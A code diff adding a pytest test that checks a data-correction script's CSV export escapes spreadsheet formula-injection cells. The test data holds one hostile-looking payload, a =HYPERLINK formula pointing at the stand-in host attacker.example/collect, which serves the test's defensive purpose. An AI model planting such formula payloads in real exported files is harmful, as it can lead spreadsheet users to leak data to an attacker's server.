@@ -1,3 +1,5 @@
+import csv
+
 import numpy as np
 import pandas as pd
 import pytest
@@ -6,6 +8,7 @@ from scripts.apply_refined_corrections import (
     apply_level_shift_correction,
     calculate_non_zero_average,
     load_identified_outliers,
+    output_file_name,
     save_corrected_files,
 )
 
@@ -179,3 +182,27 @@ def test_calculate_non_zero_average_complex_objects():
     """Test with uncoercible complex objects."""
     series = pd.Series([[1], {"a": 1}, 2.0])
     assert calculate_non_zero_average(series) == 2.0
+
+
+def test_save_corrected_files_escapes_malicious_cells(tmp_path):
+    """CSV output from save_corrected_files must neutralize formula payloads."""
+    raw_file = str(tmp_path / "S26_Y01.txt")
+    payload = '=HYPERLINK("http://attacker.example/collect","click")'
+    raw_dataframes = {
+        raw_file: pd.DataFrame(
+            {0: [1, 2], 1: [payload, "safe"]}
+        )
+    }
+    applied_corrections = [{"File_Corrected": output_file_name(raw_file)}]
+    raw_file_map = {"S26": {1: raw_file}}
+
+    save_corrected_files(applied_corrections, raw_file_map, raw_dataframes, tmp_path)
+
+    out_file = tmp_path / output_file_name(raw_file)
+    with open(out_file, newline="") as f:
+        rows = list(csv.reader(f))
+
+    assert len(rows) == 2
+    assert len(rows[0]) == 2
+    assert rows[0][1] == "'" + payload
+    assert rows[1][1] == "safe"
